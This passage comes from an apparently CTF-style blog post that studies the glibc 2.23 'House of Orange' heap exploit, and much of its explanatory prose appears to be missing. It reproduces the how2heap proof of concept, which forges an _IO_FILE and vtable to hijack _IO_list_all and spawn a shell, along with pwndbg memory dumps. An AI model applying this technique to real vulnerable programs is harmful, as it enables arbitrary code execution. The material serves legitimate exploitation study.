(s)))</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;<span class="comment">//avmain_areantop chunk</span></span><br><span class="line">  old_size = chunksize (old_top);<span class="comment">//top chunk </span></span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">//oldtop+oldsize</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||<span class="comment">//==0malloc</span></span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p></p><ol><li> size (4k),topchunk+size</li><li>size  MINSIZE(0x10)</li><li>size  chunk size + MINSIZE(0x10)</li><li>size  prev inuse  1</li></ol><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fake_size 0xfd1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    ptr=(<span class="type">void</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">40</span>);<span class="comment">//0x20+8=40topchunksize</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc(0x20)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151240973.png" alt="image-20230406151240973"></p><p>0x602030+0x20fd0&#x3D;0x623000 4k<code>(unsigned long) old_end &amp; (pagesize - 1)) == 0)</code>size0xfd1 0x1fd1 0x2fd1</p><p><code>    *((long long*)ptr)=fake_size;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151445090.png" alt="image-20230406151445090"></p><p><code>malloc(0x1000)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151803663.png" alt="image-20230406151803663"></p><p> <code>malloc(0x60);</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406152257567.png" alt="image-20230406152257567"></p><p><img src="/2023/04/06/House-of-orange/image-20230406152317119.png" alt="image-20230406152317119"></p><h3 id="how2heap-example"><a href="#how2heap-example" class="headerlink" title="how2heap example"></a>how2heap example</h3><p><strong>mdorz</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>brk0x21000</p><p><code>p2 = malloc(0x1000);</code>unsorted bin</p><p><img src="/2023/04/06/House-of-orange/image-20230407001924067.png" alt="image-20230407001924067"></p><p>0x1000chunkbrktopchunk</p><p><img src="/2023/04/06/House-of-orange/image-20230407002211084.png" alt="image-20230407002211084"></p><p><code>  io_list_all = top[2] + 0x9a8;</code>unsortedbin_io_list_all&#x3D;<strong>0x7ffff7dd2520</strong></p><p><img src="/2023/04/06/House-of-orange/image-20230407002519360.png" alt="image-20230407002519360"></p><p><code>  top[3] = io_list_all - 0x10;    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);    top[1] = 0x61;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230407002923144.png" alt="image-20230407002923144"></p><p><code>malloc(0x10)</code></p><p>0x602400chunk-&gt;bk-&gt;fd&#x3D;unsortedbinio_list_allunsortedbin</p><p><strong>0x61</strong></p><ul><li><p>malloc(0x10)0x61chunk0x60smallbinmain_arena+0xc0bkchunk</p><p><img src="/2023/04/06/House-of-orange/image-20230407012803059.png" alt="image-20230407012803059"></p></li><li><p>io_list_allmain_arena+88,IO_FILE_plus_chainmain_arena+88+0x68&#x3D;main_arena+0xc00x60smallbin</p><p><img src="/2023/04/06/House-of-orange/image-20230407012846958.png" alt="image-20230407012846958"></p></li><li><p>io_list_all0x602400</p><p><img src="/2023/04/06/House-of-orange/image-20230407012952664.png" alt="image-20230407012952664"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p>vtable_overflow</p></li><li><p>bkbk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc_printerr</code>,_overflow</p><p><code>__libc_malloc</code> &#x3D;&gt; <code>malloc_printerr</code> &#x3D;&gt; <code>__libc_message</code> &#x3D;&gt; <code>abort</code> &#x3D;&gt; <code>fflush</code>&#x3D;&gt;<code>_IO_flush_all_lockp</code>&#x3D;&gt;<code>_IO_OVERFLOW</code></p><p>_IO_flush_all_lockp FSOP _IO_OVERFLOW_IO_FILE_plusmemcpy( ( char *) top, &#x2F;bin&#x2F;sh\x00, 8)system</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus*)<span class="number">0x602400</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">4196319</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x602460</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t*)<span class="number">0x602460</span>                                                                                                                                                                       </span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x4007df</span> &lt;winner&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x602460</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure></li></ul><p>malloc fail shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2.23&gt; ./house_of_orange </span><br><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./house_of_orange&#x27;: malloc(): memory corruption: 